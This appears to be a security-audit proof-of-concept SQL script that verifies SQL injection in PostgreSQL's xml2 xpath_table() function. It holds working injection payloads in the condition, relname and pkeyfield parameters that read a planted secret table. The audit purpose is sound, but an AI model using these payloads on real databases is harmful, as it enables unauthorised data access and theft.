-- S-4: SQL Injection via Unquoted Parameters in xml2/xpath.c xpath_table()
-- Severity: High
-- File: contrib/xml2/xpath.c, lines 682-690
--
-- All four SQL-building parameters are interpolated raw into:
--   SELECT pkeyfield, xmlfield FROM relname WHERE condition
-- SPI_exec() is used which can handle multiple statements.
--
-- Prerequisites: CREATE EXTENSION xml2;

\echo '=== S-4: xml2 xpath_table() SQL injection test ==='

DROP TABLE IF EXISTS s4_docs CASCADE;
DROP TABLE IF EXISTS s4_secret CASCADE;

CREATE TABLE s4_docs (
    id int PRIMARY KEY,
    xmldata xml
);
INSERT INTO s4_docs VALUES (1, '<doc><title>public_data</title></doc>');

CREATE TABLE s4_secret (
    id int PRIMARY KEY,
    secret_data text
);
INSERT INTO s4_secret VALUES (1, 'STOLEN_SECRET_DATA_12345');

\echo 'Test 1: Normal xpath_table usage...'
SELECT * FROM xpath_table('id', 'xmldata', 's4_docs', '/doc/title', 'true')
    AS t(id int, title text);

\echo ''
\echo 'Test 2: Condition parameter injection...'

-- The condition is appended raw: SELECT id, xmldata FROM s4_docs WHERE <condition>
-- Inject: true) UNION (SELECT 1, ('<x>' || secret_data || '</x>')::xml FROM s4_secret WHERE (true
-- No, simpler approach: just modify the condition to always be true or to change behavior
-- The simplest proof: inject a condition that should not normally return data

DO $$
DECLARE
    rec record;
BEGIN
    -- Normal query with condition "id = 999" returns nothing
    -- But inject: id = 999 OR true
    FOR rec IN
        SELECT * FROM xpath_table(
            'id', 'xmldata', 's4_docs', '/doc/title',
            'id = 999 OR true'
        ) AS t(id int, title text)
    LOOP
        RAISE NOTICE 'Condition injection returned row: id=%, title=%', rec.id, rec.title;
        IF rec.title = 'public_data' THEN
            RAISE NOTICE 'S-4 RESULT (condition): *** VERIFIED *** - "OR true" bypassed WHERE id=999 filter';
        END IF;
    END LOOP;
EXCEPTION WHEN OTHERS THEN
    RAISE NOTICE 'S-4 condition error: %', SQLERRM;
END;
$$;

\echo ''
\echo 'Test 3: relname injection to read from different table...'

-- Inject into relname: (SELECT id, ('<doc><title>' || secret_data || '</title></doc>')::xml AS xmldata FROM s4_secret) AS inj --
DO $$
DECLARE
    rec record;
    found_secret boolean := false;
BEGIN
    FOR rec IN
        SELECT * FROM xpath_table(
            'id', 'xmldata',
            $inj$(SELECT id, ('<doc><title>' || secret_data || '</title></doc>')::xml AS xmldata FROM s4_secret) AS inj --$inj$,
            '/doc/title',
            'true'
        ) AS t(id int, title text)
    LOOP
        RAISE NOTICE 'Relname injection returned: id=%, title=%', rec.id, rec.title;
        IF rec.title LIKE '%STOLEN_SECRET%' THEN
            found_secret := true;
        END IF;
    END LOOP;

    IF found_secret THEN
        RAISE NOTICE 'S-4 RESULT (relname): *** VERIFIED *** - Secret data exfiltrated from s4_secret via relname injection!';
    ELSE
        RAISE NOTICE 'S-4 RESULT (relname): Data returned but secret not found';
    END IF;
EXCEPTION WHEN OTHERS THEN
    RAISE NOTICE 'S-4 relname injection error: %', SQLERRM;
END;
$$;

\echo ''
\echo 'Test 4: pkeyfield injection to run arbitrary expressions...'

-- pkeyfield goes into: SELECT <pkeyfield>, xmlfield FROM relname WHERE condition
-- Inject: id, ('<doc><title>' || (SELECT secret_data FROM s4_secret LIMIT 1) || '</title></doc>')::xml AS xmldata --
DO $$
DECLARE
    rec record;
    found_secret boolean := false;
BEGIN
    FOR rec IN
        SELECT * FROM xpath_table(
            $inj$id, ('<doc><title>' || (SELECT secret_data FROM s4_secret LIMIT 1) || '</title></doc>')::xml AS xmldata_injected --$inj$,
            'xmldata',
            's4_docs',
            '/doc/title',
            'true'
        ) AS t(id int, title text)
    LOOP
        RAISE NOTICE 'pkeyfield injection returned: id=%, title=%', rec.id, rec.title;
        IF rec.title LIKE '%STOLEN_SECRET%' THEN
            found_secret := true;
        END IF;
    END LOOP;

    IF found_secret THEN
        RAISE NOTICE 'S-4 RESULT (pkeyfield): *** VERIFIED *** - Secret data exfiltrated via pkeyfield injection!';
    ELSE
        RAISE NOTICE 'S-4 RESULT (pkeyfield): Data returned but secret not found';
    END IF;
EXCEPTION WHEN OTHERS THEN
    RAISE NOTICE 'S-4 pkeyfield injection error: %', SQLERRM;
END;
$$;

-- Cleanup
DROP TABLE IF EXISTS s4_docs CASCADE;
DROP TABLE IF EXISTS s4_secret CASCADE;

\echo '=== S-4 test complete ==='
